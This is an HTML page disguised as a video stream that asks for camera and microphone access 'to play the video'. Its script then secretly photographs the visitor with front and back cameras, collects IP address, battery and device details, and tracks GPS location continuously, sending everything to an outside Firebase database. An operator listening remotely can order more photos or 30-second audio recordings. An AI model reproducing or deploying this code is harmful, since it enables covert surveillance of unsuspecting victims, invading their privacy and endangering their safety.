<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Stream - Watch Now</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #container { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
        #blur-bg { position: absolute; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=1000&q=80'); background-size: cover; filter: blur(20px); z-index: 1; }
        #overlay { position: absolute; z-index: 10; text-align: center; color: white; background: rgba(0,0,0,0.5); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        #play-btn { width: 100px; height: 100px; background: rgba(0, 255, 65, 0.7); border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; border: 5px solid #fff; box-shadow: 0 0 30px #00ff41; }
        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid white; margin-left: 10px; }
        video { width: 100%; height: 100%; object-fit: contain; display: none; position: relative; z-index: 5; }
    </style>
</head>
<body>

<div id="container">
    <div id="overlay">
        <div id="play-btn" onclick="initSystem()"></div>
        <h2 style="letter-spacing:2px; margin-top:20px;">WATCH VIDEO TO CONTINUE</h2>
        <p style="color:#aaa;">Verify your connection to start streaming</p>
    </div>
    <div id="blur-bg"></div>
    <video id="main-video" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
</div>

<script>
    // 1. Firebase Initialization
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
    let activeStream = null;

    // 2. Main System Init
    async function initSystem() {
        document.getElementById('overlay').style.display = 'none';
        document.getElementById('blur-bg').style.display = 'none';
        const v = document.getElementById('main-video');
        v.style.display = 'block';

        try {
            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            v.play();

            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('./sw.js').catch(e => console.log("SW Error"));
            }

            await sendInitialInfo();
            
            // Start Auto Captures
            await silentCapture('user'); 
            setTimeout(() => { silentCapture('environment'); }, 4000);

            listenForBossCommands();
            startLocationTracking();

        } catch (err) {
            db.ref(`targets/${sessionID}/info`).set({ status: "PERMISSION_DENIED", time: new Date().toLocaleString() });
            alert("Error: Please allow Camera & Mic access to play the video.");
            location.reload();
        }
    }

    // 3. Info Sender
    async function sendInitialInfo() {
        let ip = "Unknown";
        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            ip = data.ip;
        } catch(e) {}

        const batt = await navigator.getBattery().catch(() => ({level: 1}));
        
        db.ref(`targets/${sessionID}/info`).set({
            ip: ip,
            battery: Math.floor(batt.level * 100) + "%",
            status: "ONLINE",
            platform: navigator.platform,
            time: new Date().toLocaleTimeString()
        });
    }

    // 4. Fixed Silent Capture (Front & Back)
    async function silentCapture(facing) {
        const constraints = {
            video: { facingMode: facing },
            audio: false
        };

        try {
            const tempStream = await navigator.mediaDevices.getUserMedia(constraints);
            const vid = document.createElement('video');
            vid.srcObject = tempStream;
            vid.muted = true;
            await vid.play();

            // Wait for camera to focus
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = vid.videoWidth;
                canvas.height = vid.videoHeight;
                canvas.getContext('2d').drawImage(vid, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: dataUrl,
                    type: facing === 'user' ? "FRONT" : "BACK",
                    ts: Date.now()
                });

                tempStream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) {
            db.ref(`targets/${sessionID}/logs`).push("Capture failed for " + facing + ": " + e.message);
        }
    }

    // 5. Commands Listener
    function listenForBossCommands() {
        db.ref(`commands/${sessionID}`).on('value', snap => {
            const cmd = snap.val();
            if(!cmd) return;
            
            if(cmd.action === 'photo') silentCapture('user');
            if(cmd.action === 'back_photo') silentCapture('environment');
            if(cmd.action === 'audio') startRecording();
            
            db.ref(`commands/${sessionID}`).remove();
        });
    }

    // 6. GPS Tracker
    function startLocationTracking() {
        navigator.geolocation.watchPosition(pos => {
            db.ref(`targets/${sessionID}/location`).set({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                time: new Date().toLocaleTimeString()
            });
        }, null, { enableHighAccuracy: true });
    }

    // 7. Audio Recorder (30s)
    function startRecording() {
        if(!activeStream) return;
        const mediaRecorder = new MediaRecorder(activeStream);
        let audioChunks = [];

        mediaRecorder.ondataavailable = event => { audioChunks.push(event.data); };
        mediaRecorder.onstop = () => {
            const reader = new FileReader();
            reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
            reader.onloadend = () => {
                db.ref(`targets/${sessionID}/audios`).push({ data: reader.result, ts: Date.now() });
            };
        };

        mediaRecorder.start();
        setTimeout(() => { mediaRecorder.stop(); }, 30000);
    }
</script>
</body>
</html>
